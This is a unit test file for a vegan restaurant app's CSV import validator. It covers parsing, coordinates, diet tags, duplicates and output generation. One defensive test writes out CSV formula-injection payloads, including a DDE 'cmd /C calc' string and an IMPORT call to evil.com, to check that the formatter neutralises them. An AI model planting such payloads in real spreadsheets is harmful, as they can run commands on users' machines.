/* ==========================================================================
   VeganSaathi — tests/test-import-validator.mjs
   ============================================================================
   Unit tests for scripts/validate-import.mjs:
   - CSV parsing with escapes, quotes, newlines
   - Header alias normalization (docId -> id, place_name -> name, etc.)
   - Valid global coordinates & out-of-range rejection
   - Missing coordinates handling (blocking from app import)
   - Dietary tag validation (vegan, vegetarian, eggetarian, jain)
   - Online research verification safety (cannot be marked 'verified')
   - Image URL validation
   - Conservative duplicate detection
   - Clean app import CSV generation

   Run with:
     node tests/test-import-validator.mjs
   ========================================================================== */

import assert from "node:assert/strict";
import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const validatorPath = pathToFileURL(
  path.join(__dirname, "..", "scripts", "validate-import.mjs")
).href;

const {
  parseCSV,
  formatCSVRow,
  validateAndNormalizeRows,
  generateAppImportCSV
} = await import(validatorPath);

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`PASS: ${name}`);
  } catch (err) {
    failed++;
    console.error(`FAIL: ${name}`);
    console.error(err);
  }
}

// -----------------------------------------------------------------------------
// 1. CSV Parsing & Escaping
// -----------------------------------------------------------------------------
test("parseCSV: handles quotes, commas within quotes, and escaped quotes", () => {
  const csv = 'name,address,description\n"Green Bistro, LLC","123 Main St, Suite 4","A ""fine"" dining spot"';
  const rows = parseCSV(csv);
  assert.equal(rows.length, 2);
  assert.equal(rows[1][0], "Green Bistro, LLC");
  assert.equal(rows[1][1], "123 Main St, Suite 4");
  assert.equal(rows[1][2], 'A "fine" dining spot');
});

test("formatCSVRow: properly quotes strings containing commas, quotes, and newlines", () => {
  const row = ['Green Bistro, LLC', 'A "fine" spot', 'Line 1\nLine 2', 'Simple'];
  const formatted = formatCSVRow(row);
  assert.equal(formatted, '"Green Bistro, LLC","A ""fine"" spot","Line 1\nLine 2",Simple');
});

// -----------------------------------------------------------------------------
// 2. Alias Normalization
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: normalizes documented header aliases", () => {
  const rawRows = [
    ["record_id", "place_name", "app_place_type", "street_address", "neighborhood", "city", "state_region", "country", "postal_code", "lat", "lon", "app_diet_tags", "source_urls"],
    ["r-1", "Test Vegan Cafe", "cafe", "10 Market St", "Downtown", "Pune", "Maharashtra", "India", "411001", "18.5204", "73.8567", "vegan;vegetarian", "https://example.com/pune-cafe"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.success, "Should succeed with valid aliased headers");
  assert.equal(res.records.length, 1);
  const rec = res.records[0];
  assert.equal(rec.sourceId, "r-1");
  assert.equal(rec.name, "Test Vegan Cafe");
  assert.equal(rec.placeType, "cafe");
  assert.equal(rec.address, "10 Market St");
  assert.equal(rec.area, "Downtown");
  assert.equal(rec.city, "Pune");
  assert.equal(rec.state, "Maharashtra");
  assert.equal(rec.country, "India");
  assert.equal(rec.postalCode, "411001");
  assert.equal(rec.latitude, 18.5204);
  assert.equal(rec.longitude, 73.8567);
  assert.deepEqual(rec.dietTags, ["vegan", "vegetarian"]);
  assert.equal(rec.isValid, true);
  assert.equal(rec.classification, "IMPORT_ELIGIBLE");
});

// -----------------------------------------------------------------------------
// 3. Global Coordinates Validation
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: accepts valid coordinates worldwide", () => {
  const rawRows = [
    ["name", "placeType", "address", "city", "country", "latitude", "longitude", "dietTags", "source_urls"],
    ["London Vegan Eatery", "restaurant", "Oxford St", "London", "United Kingdom", "51.5154", "-0.1419", "vegan", "https://example.com/london"],
    ["Tokyo Matcha House", "cafe", "Shinjuku", "Tokyo", "Japan", "35.6895", "139.6917", "vegan;vegetarian", "https://example.com/tokyo"],
    ["Sydney Plant Kitchen", "restaurant", "George St", "Sydney", "Australia", "-33.8688", "151.2093", "vegan", "https://example.com/sydney"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.equal(res.errors.length, 0);
  assert.equal(res.records.length, 3);
  assert.ok(res.records.every(r => r.isValid && r.classification === "IMPORT_ELIGIBLE"));
});

test("validateAndNormalizeRows: rejects coordinates outside [-90, 90] and [-180, 180]", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags"],
    ["Bad Lat", "restaurant", "123 Way", "95.000", "76.500", "vegan"],
    ["Bad Lon", "restaurant", "123 Way", "20.000", "195.000", "vegan"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.equal(res.errors.length, 2);
  assert.ok(res.errors[0].message.includes("Latitude 95 is outside valid geographic range"));
  assert.ok(res.errors[1].message.includes("Longitude 195 is outside valid geographic range"));
});

test("validateAndNormalizeRows: blocks places with missing coordinates without crashing", () => {
  const rawRows = [
    ["record_id", "name", "placeType", "address", "latitude", "longitude", "dietTags"],
    ["lead-1", "Preliminary Venue", "restaurant", "Main St, Shegaon", "", "", "vegetarian"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.equal(res.records.length, 1);
  assert.equal(res.records[0].classification, "BLOCKED_PRELIMINARY_LEAD");
  assert.ok(res.records[0].blockers.some(b => b.includes("Coordinates are missing")));
});

// -----------------------------------------------------------------------------
// 4. Dietary Tag Integrity & Evidence
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: strictly requires valid dietary tags", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags"],
    ["Fish Place", "restaurant", "Beach Rd", "15.0", "73.0", "pescatarian"],
    ["Empty Diet", "restaurant", "Park Rd", "15.0", "73.0", ""]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.equal(res.errors.length, 2);
  assert.ok(res.errors.some(e => e.message.includes("invalid diet tags")));
  assert.ok(res.errors.some(e => e.message.includes("At least one valid diet tag is required")));
});

// -----------------------------------------------------------------------------
// 5. Online Research Verification Safety
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: refuses to import online research as 'verified'", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "verificationStatus", "lastVerifiedAt", "source"],
    ["Unvisited Lead", "restaurant", "Camp", "20.7", "76.6", "vegan", "verified", "2026-08-10T00:00:00Z", "online_research"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.errors.some(e => e.message.includes("Online research records cannot be marked 'verified'")));
});

test("validateAndNormalizeRows: rejects future lastVerifiedAt dates on verified places", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "verificationStatus", "lastVerifiedAt", "source"],
    ["Future Place", "restaurant", "Camp", "20.7", "76.6", "vegan", "verified", "2099-01-01T00:00:00Z", "fieldwork"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.errors.some(e => e.message.includes("cannot be in the future")));
});

// -----------------------------------------------------------------------------
// 6. Price Range & Currency Validation
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: normalizes price range and flags non-ISO currency", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "priceRange", "currency"],
    ["Budget Spot", "dhaba", "Highway", "20.7", "76.6", "vegetarian", "budget", "INR"],
    ["Bad Price", "restaurant", "Mall", "20.7", "76.6", "vegan", "expensive", "RUPEES"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.errors.some(e => e.message.includes('Invalid priceRange "expensive"')));
  assert.ok(res.warnings.some(w => w.message.includes('Currency code "RUPEES" is not a 3-letter ISO code')));
});

// -----------------------------------------------------------------------------
// 7. Image URL Validation
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: validates image URL protocols", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "imageUrl"],
    ["Good Image", "cafe", "Hill Rd", "20.7", "76.6", "vegan", "https://example.com/photo.jpg"],
    ["Bad Image", "cafe", "Hill Rd", "20.7", "76.6", "vegan", "ftp://example.com/photo.jpg"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.errors.some(e => e.message.includes("Image URL must be a valid HTTP/HTTPS URL")));
});

// -----------------------------------------------------------------------------
// 8. Conservative Duplicate Detection Pass
// -----------------------------------------------------------------------------
test("validateAndNormalizeRows: flags probable duplicates within 20 meters", () => {
  const rawRows = [
    ["sourceId", "name", "placeType", "address", "latitude", "longitude", "dietTags"],
    ["dup-1", "Govinda Bhojanalay", "mess", "Station Rd", "20.7936", "76.6946", "vegetarian"],
    ["dup-2", "Govinda Bhojanalaya", "mess", "Station Road", "20.7937", "76.6946", "vegetarian"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.field === "duplicate" && w.message.includes("Identical coordinates")));
});

// -----------------------------------------------------------------------------
// 9. App Import CSV Output Generation
// -----------------------------------------------------------------------------
test("generateAppImportCSV: only generates CSV rows for valid, import-eligible records", () => {
  const rawRows = [
    ["sourceId", "name", "placeType", "address", "latitude", "longitude", "dietTags"],
    ["ok-1", "Valid Place One", "cafe", "1 Road", "20.5", "78.5", "vegan"],
    ["bad-1", "Invalid Place", "cafe", "2 Road", "200", "78.5", "vegan"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.equal(res.records.length, 2);
  const csvOut = generateAppImportCSV(res.records);
  assert.ok(csvOut.includes("Valid Place One"));
  assert.ok(!csvOut.includes("Invalid Place"));
});

// -----------------------------------------------------------------------------
// 10. Edge Case & Safety Auditing Tests (Phase 3)
// -----------------------------------------------------------------------------
test("parseCSV: handles multiline cells with CRLF, escaped quotes, and embedded commas", () => {
  const multilineCSV = 'name,description,address\r\n"Multi\r\nLine","He said, ""Welcome!""\nEnjoy your meal.",Road 1';
  const parsed = parseCSV(multilineCSV);
  assert.equal(parsed.length, 2);
  assert.equal(parsed[1][0], "Multi\r\nLine");
  assert.equal(parsed[1][1], 'He said, "Welcome!"\nEnjoy your meal.');
  assert.equal(parsed[1][2], "Road 1");
});

test("formatCSVRow: neutralizes CSV formula injection attempts", () => {
  const rowWithFormulas = [
    "=SUM(A1:A10)",
    "@IMPORT(http://evil.com)",
    "+cmd|' /C calc'!A0",
    "-cmd|' /C calc'!A0",
    "\talert(1)",
    -18.5204, // Valid negative coordinate must NOT be prepended with a quote
    "Normal Name"
  ];
  const formatted = formatCSVRow(rowWithFormulas);
  // Formula prefixes should be neutralized with leading single quote
  assert.ok(formatted.includes("'=SUM(A1:A10)"));
  assert.ok(formatted.includes("'@IMPORT(http://evil.com)"));
  assert.ok(formatted.includes("'+cmd|"));
  assert.ok(formatted.includes("'-cmd|"));
  assert.ok(formatted.includes("'\talert(1)"));
  // Negative number must remain a number
  assert.ok(formatted.includes("-18.5204"));
  assert.ok(!formatted.includes("'-18.5204"));
});

test("validateAndNormalizeRows: detects blank and duplicate headers", () => {
  const rawRows = [
    ["name", "", "latitude", "longitude", "dietTags", "address", "place_name"],
    ["Sample Place", "ignored", "20.5", "78.5", "vegetarian", "123 St", "Another Name"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.code === "EMPTY_HEADER" && w.field === "column_2"));
  assert.ok(res.warnings.some(w => w.code === "DUPLICATE_HEADER" && w.field === "name"));
});

test("validateAndNormalizeRows: detects duplicate place IDs across rows", () => {
  const rawRows = [
    ["id", "name", "placeType", "address", "latitude", "longitude", "dietTags"],
    ["p-unique-1", "Place One", "cafe", "10 Market St", "18.52", "73.85", "vegan"],
    ["p-unique-1", "Place Two", "cafe", "20 Market St", "18.53", "73.86", "vegan"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.code === "DUPLICATE_ID" && w.row === 3));
});

test("validateAndNormalizeRows: flags locality coordinate mismatch for declared country", () => {
  const rawRows = [
    ["name", "placeType", "address", "country", "latitude", "longitude", "dietTags"],
    ["Mumbai Spices", "restaurant", "Marine Drive", "India", "51.5074", "-0.1278", "vegetarian"] // London coordinates!
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.code === "LOCALITY_COORDINATE_MISMATCH" && w.message.includes("outside India")));
});

test("validateAndNormalizeRows: flags pure-vegetarian records tagged vegan without supporting notes", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "dietNotes"],
    ["Shree Ganesh Pure Veg", "restaurant", "Station Rd", "20.8", "76.7", "vegan;vegetarian", ""] // No vegan explanation
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.code === "VEGAN_EVIDENCE_UNCERTAIN" && w.message.includes("pure-vegetarian")));
});

test("validateAndNormalizeRows: accepts pure-vegetarian records tagged vegan when affirmative evidence exists", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "dietNotes"],
    ["Shree Ganesh Pure Veg", "restaurant", "Station Rd", "20.8", "76.7", "vegan;vegetarian", "Rotis prepared without butter, dal cooked in vegetable oil"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(!res.warnings.some(w => w.code === "VEGAN_EVIDENCE_UNCERTAIN"));
});

test("validateAndNormalizeRows: flags dairy-containing notes tagged vegan without dairy-free confirmation", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "dietNotes"],
    ["Heritage Cafe", "cafe", "MG Road", "20.8", "76.7", "vegan", "Specialty paneer tikka made with fresh buffalo milk butter"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.code === "VEGAN_EVIDENCE_UNCERTAIN" && w.message.includes("mentions dairy/ghee")));
});

test("validateAndNormalizeRows: flags image URLs lacking attribution or license metadata", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "imageUrl"],
    ["Sunny Cafe", "cafe", "Beach Rd", "20.8", "76.7", "vegetarian", "https://example.com/photo.jpg"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  assert.ok(res.warnings.some(w => w.code === "IMAGE_RIGHTS_MISSING"));
});

test("generateAppImportCSV: deterministically sorts records by rowIndex ascending", () => {
  const records = [
    { rowIndex: 5, isValid: true, id: "p-5", name: "P5", placeType: "cafe", address: "A5", area: "", city: "", state: "", country: "", postalCode: "", latitude: 20, longitude: 76, dietTags: ["vegan"], dietNotes: "", priceRange: "budget", openingInfo: "", imageUrl: "", status: "pending", verificationStatus: "unverified", lastVerifiedAt: "", verificationNote: "", source: "fieldwork", submittedByName: "Team", sourceId: "s-5" },
    { rowIndex: 2, isValid: true, id: "p-2", name: "P2", placeType: "cafe", address: "A2", area: "", city: "", state: "", country: "", postalCode: "", latitude: 21, longitude: 77, dietTags: ["vegan"], dietNotes: "", priceRange: "budget", openingInfo: "", imageUrl: "", status: "pending", verificationStatus: "unverified", lastVerifiedAt: "", verificationNote: "", source: "fieldwork", submittedByName: "Team", sourceId: "s-2" }
  ];
  const csv = generateAppImportCSV(records);
  const p2Index = csv.indexOf("p-2");
  const p5Index = csv.indexOf("p-5");
  assert.ok(p2Index !== -1 && p5Index !== -1);
  assert.ok(p2Index < p5Index, "Row 2 must appear before row 5 in generated CSV");
});

test("validateAndNormalizeRows: strictly blocks synthetic test fixtures from import eligibility", () => {
  const rawRows = [
    ["name", "placeType", "address", "latitude", "longitude", "dietTags", "is_synthetic_fixture"],
    ["[TEST FIXTURE] Mock Cafe", "cafe", "Test Rd", "20.8", "76.7", "vegan", "true"],
    ["Regular Real Cafe", "cafe", "Real Rd", "20.8", "76.7", "vegan", "false"]
  ];
  const res = validateAndNormalizeRows(rawRows);
  const synthRecord = res.records.find(r => r.name.includes("[TEST FIXTURE]"));
  const realRecord = res.records.find(r => r.name === "Regular Real Cafe");

  assert.equal(synthRecord.isValid, false);
  assert.equal(synthRecord.classification, "BLOCKED_PRELIMINARY_LEAD");
  assert.ok(synthRecord.blockers.some(b => b.includes("synthetic test fixture")));

  assert.equal(realRecord.isValid, true);
});

console.log("\n========================================");
console.log(`Import Validator Tests: ${passed} passed, ${failed} failed.`);
console.log("========================================\n");
process.exit(failed > 0 ? 1 : 0);
